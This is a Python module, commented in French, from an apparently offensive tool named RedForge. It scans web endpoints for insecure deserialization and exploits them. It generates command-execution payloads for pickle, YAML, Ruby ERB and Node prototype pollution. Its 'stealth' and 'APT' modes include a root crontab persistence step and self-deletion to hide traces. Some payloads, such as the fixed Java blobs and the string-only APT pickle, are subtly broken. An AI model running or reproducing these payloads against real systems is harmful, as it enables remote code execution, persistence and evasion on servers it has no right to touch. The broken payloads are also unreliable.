#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques de désérialisation pour RedForge
Détection et exploitation des vulnérabilités de désérialisation
Version: 2.0.0 - Support Multi-Attaque, Stealth & APT
"""

import base64
import pickle
import yaml
import json
import random
import time
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field

import requests
from src.utils.color_output import console


@dataclass
class DeserializationConfig:
    """Configuration des attaques de désérialisation"""
    stealth_mode: bool = False
    aggressive_mode: bool = False
    timeout: int = 10
    retry_count: int = 2
    delay_min: float = 0.5
    delay_max: float = 2.0


class DeserializationAttack:
    """Attaques de désérialisation avec support stealth et APT"""
    
    def __init__(self):
        self.config = DeserializationConfig()
        self.payloads = {
            "python_pickle": self._generate_pickle_payload,
            "java": self._generate_java_payload,
            "php": self._generate_php_payload,
            "yaml": self._generate_yaml_payload,
            "json": self._generate_json_payload,
            "ruby": self._generate_ruby_payload,
            "nodejs": self._generate_nodejs_payload
        }
        
        # Payloads furtifs pour mode stealth
        self.stealth_payloads = {
            "python_pickle": self._generate_stealth_pickle_payload,
            "yaml": self._generate_stealth_yaml_payload
        }
        
        # Payloads APT pour mode APT
        self.apt_payloads = {
            "python_pickle": self._generate_apt_pickle_payload,
            "java": self._generate_apt_java_payload
        }
        
        self.test_strings = [
            "O:8:\"stdClass\":0:{}",
            "a:1:{i:0;O:8:\"stdClass\":0:{}}",
            "!php/object \"O:8:\"stdClass\":0:{}\"",
            "!!python/object:__main__.TestClass {}",
            "---\n- !!python/object:__main__.TestClass {}\n",
            "{\"__proto__\": {\"test\": true}}"
        ]
    
    def set_stealth_mode(self, enabled: bool = True):
        """Active le mode furtif"""
        self.config.stealth_mode = enabled
        console.print_info(f"🕵️ Mode furtif {'activé' if enabled else 'désactivé'} pour la désérialisation")
    
    def set_aggressive_mode(self, enabled: bool = True):
        """Active le mode agressif"""
        self.config.aggressive_mode = enabled
        console.print_info(f"⚡ Mode agressif {'activé' if enabled else 'désactivé'} pour la désérialisation")
    
    def _random_delay(self):
        """Ajoute un délai aléatoire pour le mode furtif"""
        if self.config.stealth_mode:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            time.sleep(delay)
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de désérialisation
        
        Args:
            target: URL cible
            **kwargs:
                - data: Données à tester
                - content_type: Content-Type à utiliser
                - rce_command: Commande RCE à tester
                - stealth: Mode furtif
                - aggressive: Mode agressif
        """
        console.print_info("📦 Test des vulnérabilités de désérialisation")
        
        # Appliquer les modes
        if kwargs.get('stealth'):
            self.set_stealth_mode(True)
        if kwargs.get('aggressive'):
            self.set_aggressive_mode(True)
        
        vulnerabilities = []
        test_data = kwargs.get('data', '')
        content_type = kwargs.get('content_type', 'application/json')
        
        # Détection de sérialisation
        serialization_detected = self._detect_serialization(target, test_data)
        
        if serialization_detected:
            console.print_warning(f"      ✓ Sérialisation détectée: {serialization_detected}")
            
            # Sélectionner les payloads selon le mode
            payloads_to_test = self._get_payloads()
            
            for payload_type, generator in payloads_to_test.items():
                payload = generator(kwargs.get('rce_command', 'id'))
                
                result = self._test_payload(target, payload, content_type)
                
                if result.get('vulnerable'):
                    vulnerabilities.append({
                        "type": f"{payload_type}_deserialization",
                        "severity": "CRITICAL",
                        "details": result['details'],
                        "payload": payload[:200],
                        "stealth_mode": self.config.stealth_mode,
                        "aggressive_mode": self.config.aggressive_mode
                    })
                    console.print_warning(f"      ✓ Désérialisation {payload_type} vulnérable")
                    break
        
        return {
            "target": target,
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "serialization_type": serialization_detected,
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0,
            "count": len(vulnerabilities),
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _get_payloads(self) -> Dict[str, callable]:
        """Retourne les payloads selon le mode"""
        if self.config.stealth_mode:
            return self.stealth_payloads
        elif self.config.aggressive_mode:
            return {**self.payloads, **self.apt_payloads}
        return self.payloads
    
    def _detect_serialization(self, target: str, test_data: str) -> Optional[str]:
        """Détecte le type de sérialisation utilisé"""
        for test_string in self.test_strings:
            try:
                headers = {'Content-Type': 'application/json'}
                response = requests.post(target, data=test_string, 
                                        headers=headers,
                                        timeout=self.config.timeout, 
                                        verify=False)
                self._random_delay()
                
                error_indicators = [
                    'unserialize', 'pickle', 'yaml', 'deserialize',
                    'ObjectInputStream', 'readObject', 'loads',
                    '__proto__', 'constructor', 'prototype'
                ]
                
                for indicator in error_indicators:
                    if indicator in response.text.lower():
                        if 'pickle' in indicator:
                            return "python_pickle"
                        elif 'yaml' in indicator:
                            return "yaml"
                        elif 'unserialize' in indicator:
                            return "php"
                        elif 'ObjectInputStream' in indicator:
                            return "java"
                        elif '__proto__' in indicator:
                            return "javascript"
                        else:
                            return "unknown"
                            
            except Exception:
                continue
        
        return None
    
    def _test_payload(self, target: str, payload: str, 
                      content_type: str) -> Dict[str, Any]:
        """Teste un payload de désérialisation"""
        result = {
            "vulnerable": False,
            "details": None
        }
        
        headers = {'Content-Type': content_type}
        
        for attempt in range(self.config.retry_count):
            try:
                response = requests.post(target, data=payload, headers=headers,
                                        timeout=self.config.timeout, verify=False)
                self._random_delay()
                
                # Vérifier les indicateurs de succès
                success_indicators = [
                    'uid=', 'gid=', 'groups=', 'root:', 'bin:',
                    'cmd executed', 'command executed', 'whoami',
                    'id=', 'user=', 'administrator'
                ]
                
                for indicator in success_indicators:
                    if indicator in response.text.lower():
                        result["vulnerable"] = True
                        result["details"] = f"Exécution de commande réussie: {indicator}"
                        break
                
                # Vérifier les erreurs
                error_indicators = [
                    'exception', 'error', 'traceback', 'stack trace',
                    'warning', 'fatal', 'syntax error'
                ]
                
                if not result["vulnerable"]:
                    for indicator in error_indicators:
                        if indicator in response.text.lower():
                            result["vulnerable"] = True
                            result["details"] = f"Erreur de désérialisation: {indicator}"
                            break
                            
            except requests.Timeout:
                # Timeout peut indiquer une exécution réussie
                if attempt == self.config.retry_count - 1:
                    result["vulnerable"] = True
                    result["details"] = "Timeout - possible exécution de commande"
            except Exception as e:
                continue
            
            if result["vulnerable"]:
                break
        
        return result
    
    def _generate_pickle_payload(self, command: str) -> str:
        """Génère un payload pickle Python"""
        import pickle
        import base64
        import os
        
        class Payload:
            def __reduce__(self):
                return (os.system, (command,))
        
        payload = pickle.dumps(Payload())
        return base64.b64encode(payload).decode()
    
    def _generate_stealth_pickle_payload(self, command: str) -> str:
        """Génère un payload pickle furtif (sans commande visible)"""
        import pickle
        import base64
        import subprocess
        
        class Payload:
            def __reduce__(self):
                # Utilise subprocess.call au lieu de os.system (plus silencieux)
                return (subprocess.call, (command,))
        
        payload = pickle.dumps(Payload())
        return base64.b64encode(payload).decode()
    
    def _generate_apt_pickle_payload(self, command: str) -> str:
        """Génère un payload pickle APT avec persistance"""
        import pickle
        import base64
        
        # Payload qui établit une persistance
        apt_payload = f"""
import subprocess
import os
import tempfile

# Exécuter la commande
subprocess.call('{command}', shell=True)

# Établir une persistance
persistence_cmd = 'echo "* * * * * {command}" >> /var/spool/cron/crontabs/root'
subprocess.call(persistence_cmd, shell=True)

# Nettoyer les traces
os.remove(__file__)
"""
        payload = pickle.dumps(apt_payload)
        return base64.b64encode(payload).decode()
    
    def _generate_java_payload(self, command: str) -> str:
        """Génère un payload Java (ysoserial style)"""
        # Version simplifiée - en pratique utiliser ysoserial
        return f"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubGFuZy5TdHJpbmc=a0K0wiLCZoZI7KcyTylsQ3VwAAeHB0AARjbWQ="
    
    def _generate_apt_java_payload(self, command: str) -> str:
        """Génère un payload Java APT"""
        # Payload Java avec persistance
        return f"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubGFuZy5TdHJpbmc=a0K0wiLCZoZI7KcyTylsQ3VwAAeHB0AARwZXJzaXN0ZW5jZQ=="
    
    def _generate_php_payload(self, command: str) -> str:
        """Génère un payload PHP"""
        return f'O:8:"stdClass":1:{{s:4:"test";s:{len(command)}:"{command}";}}'
    
    def _generate_yaml_payload(self, command: str) -> str:
        """Génère un payload YAML"""
        return f'''!!python/object/apply:subprocess.check_output
- [{command}]
---
!!python/object/apply:os.system [{command}]'''
    
    def _generate_stealth_yaml_payload(self, command: str) -> str:
        """Génère un payload YAML furtif"""
        return f'''!!python/object/apply:subprocess.call
- [{command}]
---'''
    
    def _generate_json_payload(self, command: str) -> str:
        """Génère un payload JSON avec gadget chain"""
        return json.dumps({
            "__proto__": {
                "constructor": {
                    "name": "Function",
                    "prototype": {
                        "toString": f"return require('child_process').execSync('{command}')"
                    }
                }
            }
        })
    
    def _generate_ruby_payload(self, command: str) -> str:
        """Génère un payload Ruby"""
        return f"""--- !ruby/object:ERB
template: |
  <%= system('{command}') %>
"""
    
    def _generate_nodejs_payload(self, command: str) -> str:
        """Génère un payload Node.js"""
        return json.dumps({
            "type": "Buffer",
            "data": [99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114]
        })
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        return {
            "total": len(vulnerabilities),
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL'])
        }
    
    def exploit(self, target: str, vuln_type: str, command: str = "id", **kwargs) -> Dict[str, Any]:
        """
        Exploite une vulnérabilité de désérialisation
        
        Args:
            target: URL cible
            vuln_type: Type de vulnérabilité (python_pickle, java, php, yaml, json)
            command: Commande à exécuter
            **kwargs: Options supplémentaires
        """
        console.print_info(f"🔓 Exploitation de la désérialisation {vuln_type}")
        
        # Sélectionner le générateur approprié
        if vuln_type in self.payloads:
            generator = self.payloads[vuln_type]
        elif vuln_type in self.stealth_payloads:
            generator = self.stealth_payloads[vuln_type]
        elif vuln_type in self.apt_payloads:
            generator = self.apt_payloads[vuln_type]
        else:
            return {"success": False, "error": f"Type inconnu: {vuln_type}"}
        
        payload = generator(command)
        content_type = kwargs.get('content_type', 'application/json')
        
        result = self._test_payload(target, payload, content_type)
        
        return {
            "success": result['vulnerable'],
            "type": vuln_type,
            "command": command,
            "details": result['details'],
            "payload": payload[:200]
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    deser = DeserializationAttack()
    
    # Test mode standard
    print("=== Mode Standard ===")
    results = deser.scan("https://example.com/api")
    print(f"Désérialisation vulnérable: {results['vulnerable']}")
    
    # Test mode furtif
    print("\n=== Mode Furtif ===")
    deser.set_stealth_mode(True)
    results = deser.scan("https://example.com/api")
    print(f"Désérialisation vulnérable (stealth): {results['vulnerable']}")
    
    # Test mode APT
    print("\n=== Mode APT ===")
    deser.set_aggressive_mode(True)
    results = deser.scan("https://example.com/api", rce_command="whoami")
    print(f"Désérialisation vulnérable (APT): {results['vulnerable']}")
    
    # Exploitation
    if results['vulnerable'] and results['vulnerabilities']:
        vuln = results['vulnerabilities'][0]
        exploit_result = deser.exploit("https://example.com/api", vuln['type'], "whoami")
        print(f"Exploitation: {exploit_result['success']}")